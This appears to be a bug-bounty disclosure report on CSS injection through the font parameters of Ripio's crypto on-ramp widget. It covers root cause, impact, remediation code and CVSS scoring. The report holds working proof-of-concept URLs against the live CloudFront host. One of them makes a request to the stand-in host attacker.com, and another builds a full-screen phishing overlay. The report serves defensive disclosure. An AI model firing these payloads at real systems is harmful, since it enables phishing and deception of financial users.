# CSS Injection in Ripio B2B Widget Enabling Phishing and UI Manipulation

## Summary

The Ripio B2B Widget hosted at `https://d2pneqdaei3b3x.cloudfront.net/index.html` is vulnerable to CSS Injection through unsanitized font customization parameters. An attacker can inject arbitrary CSS to create convincing phishing overlays and manipulate the widget's UI within the context of a financial application.

## Severity: High

**CVSS 3.1**: 7.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)

## Asset

- **Primary**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
- **Type**: B2B Widget for crypto on-ramp/off-ramp operations
- **Business Context**: Widget handles financial transactions (buy/sell crypto) for B2B partners

---

## Vulnerability Details

### Root Cause

User-supplied query parameters `_fn`, `_fo`, and `_fd` are interpolated directly into a `<style>` element without sanitization:

```javascript
// From widget source code
const customFontsText = `@import url('https://fonts.googleapis.com/css2?family=${fontOpts}'); 
  body { font-family: '${fontName}', ${fontDefault};}`;

style.innerText = getStyleInnerText(); // Injected into DOM
```

### Exploitation

Payload closes CSS context and injects arbitrary rules:

**Input**: `_fn=x';}*{background:red}/*`

**Generated CSS**:

```css
body { font-family: 'x';}*{background:red}/*', sans-serif;}
```

---

## Proof of Concept

### PoC 1: Visual Confirmation (Background Change)

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

**Result**: Entire widget background turns red, confirming CSS execution.

### PoC 2: Phishing Overlay

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7Dbody%3A%3Abefore%7Bcontent%3A%27HACKED%27%3Bposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Ablack%3Bcolor%3Ared%3Bfont-size%3A80px%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bz-index%3A9999%7D/*&_fo=y
```

**Result**: Full-screen overlay covers widget, demonstrating phishing capability.

### PoC 3: External Resource Loading

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Aurl%28%27https://attacker.com/log%27%29%7D/*&_fo=y
```

**Result**: Browser makes request to external URL (verified via webhook.site).

---

## Impact

### 1. Phishing Attacks (High)

Attacker can overlay fake forms on legitimate Ripio widget domain:

- Fake login forms to harvest credentials
- Fake transaction confirmations showing wrong amounts/addresses
- Fake "security verification" prompts

**Why this matters**: Users see legitimate CloudFront/Ripio domain in address bar, increasing trust in phishing content.

### 2. UI/UX Manipulation (High)

Within a financial context, attacker can:

- Display false balances or transaction statuses
- Hide legitimate warnings or confirmations
- Show fake urgency messages ("Account locked in 5 minutes")
- Manipulate displayed crypto addresses or amounts

### 3. Brand/Trust Damage (Medium)

Widget defacement on partner sites damages both Ripio and partner reputation.

---

## Additional Finding: JWT Token in URL (Design Issue)

### Observation

The widget accepts JWT authentication via URL parameter `_to`:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=<JWT>
```

This is documented in official integration guide for WebView usage.

### Security Implications

- Token persists in browser history
- Token logged in server access logs and CDN logs
- Token visible in any proxy/monitoring systems

### Note on Exfiltration

Tested CSS-based exfiltration via `background:url()` and `@import`. Browser's `Referrer-Policy: strict-origin-when-cross-origin` prevents full URL (with token) from leaking via Referer header to cross-origin destinations.

**This limits the direct token theft scenario but does not reduce the phishing/UI manipulation impact.**

---

## Potential Escalation Paths (Not Confirmed)

The following could escalate severity if present (not verified):

1. **Partner-side parameter injection**: If a B2B partner's integration passes user-controlled input to `_fn`/`_fo`/`_fd` parameters, external attackers could inject CSS into sessions with valid victim tokens.

2. **Same-origin data endpoints**: If any endpoint on `d2pneqdaei3b3x.cloudfront.net` reflects or logs the full URL, it could serve as an exfiltration channel.

3. **Deep link handlers**: If `ripio.go.link` or similar deep link services pass parameters to the widget URL without validation.

These would need to be verified separately.

---

## Remediation

### Immediate (P1)

1. **Sanitize font parameters**: Implement strict allowlist

```javascript
function sanitizeFontName(input) {
  return input ? input.replace(/[^a-zA-Z0-9\s\-]/g, "") : null;
}
```

2. **Use CSS.escape()**: For any user input in CSS context

```javascript
const safeFontName = CSS.escape(fontName);
```

### Short-term (P2)

3. **Implement CSP**:

```
Content-Security-Policy: style-src 'self' https://fonts.googleapis.com
```

4. **Add Referrer-Policy**:

```
Referrer-Policy: no-referrer
```

### Long-term (P3)

5. **Move JWT from URL**: Use POST body or secure cookies for WebView integration
6. **Partner integration review**: Audit how partners handle widget URL construction

---

## CVSS Calculation

| Metric              | Value     | Rationale                            |
| ------------------- | --------- | ------------------------------------ |
| Attack Vector       | Network   | Exploitable via URL                  |
| Attack Complexity   | Low       | Simple URL manipulation              |
| Privileges Required | None      | No authentication needed             |
| User Interaction    | Required  | Victim must open link                |
| Scope               | Unchanged | Stays within widget context          |
| Confidentiality     | Low       | No direct data exfiltration proven   |
| Integrity           | High      | Full UI control, phishing capability |
| Availability        | None      | No availability impact               |

**Score: 7.1 (High)**

---

## Attachments

1. Screenshot: Red background PoC (CSS injection confirmed)
2. Screenshot: "HACKED" overlay (phishing capability)
3. Screenshot: Webhook.site request (external resource loading)
4. Source code snippet: Vulnerable interpolation

---

## References

- Ripio Widget Documentation: https://docs.ripio.com/crypto-as-a-service/widget/buy-hold-sell-widget
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP Testing for CSS Injection

---

## Timeline

- 2025-12-01: Vulnerability discovered
- 2025-12-02: PoC developed and verified
- 2025-12-02: Report submitted
